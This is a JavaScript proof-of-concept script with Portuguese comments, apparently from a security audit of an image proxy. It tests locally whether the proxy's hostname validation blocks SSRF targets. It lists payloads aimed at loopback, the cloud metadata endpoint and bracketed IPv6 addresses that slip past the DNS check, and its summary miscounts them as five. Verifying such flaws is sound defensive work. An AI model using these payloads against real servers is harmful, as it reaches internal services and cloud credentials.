// MC99.5.2 / SEG-1 — POCO do SSRF contra o CODIGO REAL de img-proxy.mjs.
// Importa a funcao exportada e reproduz a EXATA cadeia de decisao das linhas 78-80:
//   if (isBlockedHostname(u.hostname)) -> 403
//   const ehIpLiteral = /^\d+\.\d+\.\d+\.\d+$/.test(u.hostname) || u.hostname.includes(":")
//   if (!ehIpLiteral && await resolvesToBlocked(u.hostname)) -> 403
// Nao ataca producao: avalia a validacao localmente. Sem backticks.
import { isBlockedHostname } from "./img-proxy.mjs";

const PAYLOADS = [
  ["http://127.0.0.1/", "loopback IPv4 (controlo NEGATIVO: deve ser bloqueado)"],
  ["http://localhost/", "localhost (controlo NEGATIVO)"],
  ["http://169.254.169.254/latest/meta-data/", "metadata cloud (controlo NEGATIVO)"],
  ["http://[::1]/", "loopback IPv6 entre brackets"],
  ["http://[::ffff:127.0.0.1]/", "IPv4-mapeado em IPv6 entre brackets"],
  ["http://[fc00::1]/", "ULA privada IPv6 entre brackets"],
  ["http://[fd00::1]/", "ULA privada IPv6 entre brackets (fd)"],
  ["https://i.imgur.com/foto.png", "URL LEGITIMA (controlo POSITIVO: deve ser ACEITE)"],
  ["https://exemplo.com/a.jpg", "URL LEGITIMA (controlo POSITIVO)"],
];

const avaliar = (alvo) => {
  let u; try { u = new URL(alvo); } catch { return { decisao: "400 (url invalida)" }; }
  if (u.protocol !== "http:" && u.protocol !== "https:") return { decisao: "400 (esquema)" };
  const bloqueadoLiteral = isBlockedHostname(u.hostname);
  if (bloqueadoLiteral) return { decisao: "403 (host bloqueado)", h: u.hostname, ehIpLiteral: null, dns: "nao corre" };
  const ehIpLiteral = /^\d+\.\d+\.\d+\.\d+$/.test(u.hostname) || u.hostname.includes(":");
  return {
    decisao: "PASSA A VALIDACAO -> fetch()",
    h: u.hostname,
    ehIpLiteral,
    dns: ehIpLiteral ? "SALTADA (hostname contem ':')" : "corre resolvesToBlocked",
  };
};

console.log("=== POC SSRF — img-proxy.mjs (cadeia real das linhas 78-80) ===\n");
let explorados = 0, negativosOk = 0, positivosOk = 0;
const linhas = [];
for (const [p, desc] of PAYLOADS) {
  const r = avaliar(p);
  const passa = /PASSA/.test(r.decisao);
  const ehMalicioso = /\[/.test(p);
  const legitimo = /imgur|exemplo/.test(p);
  if (ehMalicioso && passa) explorados++;
  if (!ehMalicioso && !legitimo && !passa) negativosOk++;
  if (legitimo && passa) positivosOk++;
  console.log((ehMalicioso && passa ? "EXPLORA   " : legitimo && passa ? "OK-LEGIT  " : !passa ? "BLOQUEADO " : "ATENCAO   ") + p.padEnd(42) + " -> " + r.decisao);
  console.log("             hostname=" + (r.h || "-") + " | ehIpLiteral=" + r.ehIpLiteral + " | dns=" + r.dns + "   [" + desc + "]");
  linhas.push([p, r.decisao, r.h || "-", String(r.ehIpLiteral), r.dns].join("\t"));
}
console.log("\n=== RESUMO ===");
console.log("  EXPLORADOS (IPv6 entre brackets que passam a validacao): " + explorados + " / 5");
console.log("  controlos NEGATIVOS correctamente bloqueados: " + negativosOk + " / 3");
console.log("  controlos POSITIVOS (URL legitima) aceites: " + positivosOk + " / 2");
const ssrf = explorados > 0;
console.log("\nVEREDITO SEG-1: " + (ssrf ? "SSRF CONFIRMADO E EXPLORADO (" + explorados + " payloads passam; a uma URL legitima tambem passa, logo NAO e falso positivo por bloqueio geral)" : "SSRF NAO reproduzido"));
process.exit(ssrf ? 0 : 1);
